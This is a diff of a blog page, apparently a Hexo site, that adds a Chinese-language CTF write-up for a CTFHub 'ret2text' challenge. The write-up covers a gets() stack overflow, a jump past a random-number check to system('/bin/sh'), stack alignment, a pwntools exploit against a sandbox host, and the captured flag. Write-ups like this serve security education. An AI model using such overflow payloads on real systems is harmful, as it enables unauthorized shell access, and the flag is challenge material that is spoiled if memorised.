@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/404.html"/>
+    <link rel="canonical" href="http://example.com/2026/05/09/ret2text/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,14 +86,21 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="http://example.com/404.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2text 后门函数跳过随机数校验">
+<meta property="og:url" content="http://example.com/2026/05/09/ret2text/index.html">
 <meta property="og:site_name" content="Bear">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-09T19:56:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T17:09:12.699Z">
 <meta property="article:author" content="B1ear">
+<meta property="article:tag" content="64位">
+<meta property="article:tag" content="ret2text">
+<meta property="article:tag" content="后门函数">
+<meta property="article:tag" content="栈对齐">
+<meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -107,7 +114,7 @@
     
     <title>
         
-            Page Not Found | Bear
+            ret2text 后门函数跳过随机数校验 | Bear
         
     </title>
 
@@ -416,13 +423,264 @@
 			
 
 			<div class="main-content">
-				<div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
-    </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
-    </div>
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ret2text 后门函数跳过随机数校验</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">B1ear</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-09 19:56</span>
+        <span class="mobile">2026-05-09 19:56</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-10 17:09:12</span>
+            <span class="mobile">2026-05-10 17:09:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/64%E4%BD%8D/">64位</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2text/">ret2text</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0/">后门函数</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E5%AF%B9%E9%BD%90/">栈对齐</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>CTFHub ret2text | 跳过伪随机数验证，直接劫持到 system(“&#x2F;bin&#x2F;sh”)</p>
+</blockquote>
+<h2 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>题目类型</td>
+<td>基础栈溢出 &#x2F; ret2text</td>
+</tr>
+<tr>
+<td>保护机制</td>
+<td>64位，NX 开启，无 Canary</td>
+</tr>
+<tr>
+<td>核心漏洞</td>
+<td><code>gets()</code> 无边界检查</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>IDA 反汇编发现致命漏洞：程序使用了危险函数 <code>gets()</code>。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 70h                ; 分配 0x70 栈空间</span><br><span class="line">lea     rax, [rbp+var_70]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _gets                   ; 致命漏洞：不检查输入长度</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>偏移量计算</strong>：</p>
+<ul>
+<li>缓冲区大小：<code>0x70</code> &#x3D; 112 字节</li>
+<li>覆盖 RBP：8 字节</li>
+<li><strong>总偏移量：112 + 8 &#x3D; 120 字节</strong></li>
+</ul>
+<h2 id="0x03-后门函数与陷阱绕过"><a href="#0x03-后门函数与陷阱绕过" class="headerlink" title="0x03 后门函数与陷阱绕过"></a>0x03 后门函数与陷阱绕过</h2><p>程序中有 <code>secure</code> 后门函数，但藏有陷阱：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">call    _time</span><br><span class="line">call    _srand</span><br><span class="line">call    _rand                   ; 生成随机数</span><br><span class="line">call    ___isoc99_scanf         ; 要求用户输入数字</span><br><span class="line">cmp     [rbp+var_4], eax        ; 比较用户输入和随机数</span><br><span class="line">jnz     short loc_4007C4        ; 不相等则跳过</span><br><span class="line">lea     rdi, command            ; &quot;/bin/sh&quot;</span><br><span class="line">call    _system</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>解题思路</strong>：不能直接跳到 <code>secure</code> 函数开头（无法预测随机数），而是<strong>直接跳过比较过程</strong>，劫持到 <code>lea rdi, command</code> 所在地址 <code>0x4007B8</code>。</p>
+<h2 id="0x04-栈对齐的巧妙解决"><a href="#0x04-栈对齐的巧妙解决" class="headerlink" title="0x04 栈对齐的巧妙解决"></a>0x04 栈对齐的巧妙解决</h2><p><strong>坑点</strong>：64位 glibc 要求调用 <code>system</code> 时 <code>rsp</code> 必须 16 字节对齐，否则触发 Segfault。</p>
+<p><strong>巧妙之处</strong>：由于直接跳到函数中间 <code>0x4007B8</code>，<strong>完美避开了 <code>push rbp</code> 指令</strong>，栈指针恰好满足 16 字节对齐，无需额外拼接 <code>ret</code> 地址。</p>
+<h2 id="0x05-Exploit-代码"><a href="#0x05-Exploit-代码" class="headerlink" title="0x05 Exploit 代码"></a>0x05 Exploit 代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;challenge-1cfa4b5c7c14cabf.sandbox.ctfhub.com&quot;</span>, <span class="number">36750</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">120</span>            <span class="comment"># 溢出到返回地址的偏移量</span></span><br><span class="line">shell_addr = <span class="number">0x4007B8</span>   <span class="comment"># 跳过随机数验证，直接加载 &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(shell_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input someti&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x06-执行结果"><a href="#0x06-执行结果" class="headerlink" title="0x06 执行结果"></a>0x06 执行结果</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;a09ac83246b302ff8647accc&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x07-核心考点"><a href="#0x07-核心考点" class="headerlink" title="0x07 核心考点"></a>0x07 核心考点</h2><ul>
+<li><strong>ret2text</strong>：将返回地址劫持到程序自带的后门代码</li>
+<li><strong>陷阱绕过</strong>：跳过随机数比较，直接执行 <code>system(&quot;/bin/sh&quot;)</code></li>
+<li><strong>栈对齐</strong>：64位程序调用 <code>system</code> 需要 16 字节对齐</li>
+<li><strong>地址精确定位</strong>：通过 IDA 确定 <code>lea rdi, command</code> 的精确地址</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> ret2text 后门函数跳过随机数校验</li>
+        <li><strong>Author:</strong> B1ear</li>
+        <li><strong>Created at
+                :</strong> 2026-05-09 19:56:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-10 17:09:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ear.github.io/2026/05/09/ret2text/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/64%E4%BD%8D/">#64位</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ret2text/">#ret2text</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0/">#后门函数</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E5%AF%B9%E9%BD%90/">#栈对齐</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/09/rip-ret2text-leak/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">rip 自带地址泄露的 ret2text</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/05/09/test-your-nc/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">test_your_nc Pwn 签到题</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">ret2text 后门函数跳过随机数校验</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">0x01 题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E4%B8%8E%E9%99%B7%E9%98%B1%E7%BB%95%E8%BF%87"><span class="nav-text">0x03 后门函数与陷阱绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%A0%88%E5%AF%B9%E9%BD%90%E7%9A%84%E5%B7%A7%E5%A6%99%E8%A7%A3%E5%86%B3"><span class="nav-text">0x04 栈对齐的巧妙解决</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Exploit-%E4%BB%A3%E7%A0%81"><span class="nav-text">0x05 Exploit 代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-text">0x06 执行结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E6%A0%B8%E5%BF%83%E8%80%83%E7%82%B9"><span class="nav-text">0x07 核心考点</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
 </div>
 
 			</div>
@@ -460,6 +718,22 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -584,6 +858,7 @@
         }),
     );
 </script>
+
 
 
 
